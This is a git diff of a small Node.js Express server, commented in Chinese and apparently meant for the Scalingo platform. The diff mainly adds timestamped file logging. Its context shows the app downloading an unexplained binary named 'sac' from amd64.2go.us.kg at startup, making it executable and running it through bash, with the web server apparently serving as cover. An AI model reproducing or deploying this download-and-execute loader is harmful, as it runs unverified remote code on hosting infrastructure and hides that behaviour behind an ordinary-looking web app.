@@ -5,14 +5,22 @@ const path = require('path');
 const axios = require('axios');
 const { exec } = require('child_process');
 
-const PORT = process.env.PORT || 3000;  // Scalingo 自动设置 PORT
-const FILE_PATH = '/tmp';                // Scalingo 可写目录
+const PORT = process.env.PORT || 3000;
+const FILE_PATH = '/tmp';               // Scalingo 可写目录
+const logPath = path.join(FILE_PATH, 'log.txt');
 
 // 确保 log.txt 存在
-const logPath = path.join(FILE_PATH, 'log.txt');
 if (!fs.existsSync(logPath)) {
   fs.writeFileSync(logPath, "");
 }
+
+// 写日志函数
+const writeLog = (msg) => {
+  const timestamp = new Date().toISOString();
+  fs.appendFile(logPath, `[${timestamp}] ${msg}\n`, err => {
+    if (err) console.error("写入 log.txt 出错:", err);
+  });
+};
 
 // 根路由
 app.get("/", (req, res) => {
@@ -30,9 +38,10 @@ app.get("/log", (req, res) => {
   });
 });
 
-// 下载 sac 文件到 /tmp
+// 下载 sac 文件
 const downloadSac = async () => {
   try {
+    writeLog("开始下载 sac...");
     const response = await axios({
       method: 'get',
       url: 'https://amd64.2go.us.kg/sac',
@@ -46,14 +55,22 @@ const downloadSac = async () => {
     return new Promise((resolve, reject) => {
       writer.on('finish', () => {
         exec(`chmod +x ${sacPath}`, (err) => {
-          if (err) reject(err);
-          else resolve(sacPath);
+          if (err) {
+            writeLog("chmod 出错: " + err);
+            reject(err);
+          } else {
+            writeLog("sac 下载完成并赋予可执行权限: " + sacPath);
+            resolve(sacPath);
+          }
         });
       });
-      writer.on('error', reject);
+      writer.on('error', (err) => {
+        writeLog("下载 sac 出错: " + err);
+        reject(err);
+      });
     });
   } catch (err) {
-    console.error("下载 sac 出错:", err);
+    writeLog("downloadSac 异常: " + err);
   }
 };
 
@@ -62,14 +79,16 @@ const executeSac = async () => {
   try {
     const sacPath = await downloadSac();
     if (sacPath) {
+      writeLog("开始执行 sac...");
       exec(sacPath, { shell: '/bin/bash' }, (err, stdout, stderr) => {
-        if (err) console.error("执行 sac 出错:", err);
-        if (stdout) console.log("sac 输出:", stdout);
-        if (stderr) console.error("sac 错误输出:", stderr);
+        if (err) writeLog("执行 sac 出错: " + err);
+        if (stdout) writeLog("sac 输出: " + stdout);
+        if (stderr) writeLog("sac 错误输出: " + stderr);
+        writeLog("执行 sac 完成");
       });
     }
   } catch (err) {
-    console.error("Execute 出错:", err);
+    writeLog("executeSac 异常: " + err);
   }
 };
 
@@ -78,5 +97,6 @@ executeSac();
 
 // 启动 Express 服务
 app.listen(PORT, () => {
+  writeLog(`Server is running on port: ${PORT}`);
   console.log(`Server is running on port: ${PORT}`);
 });
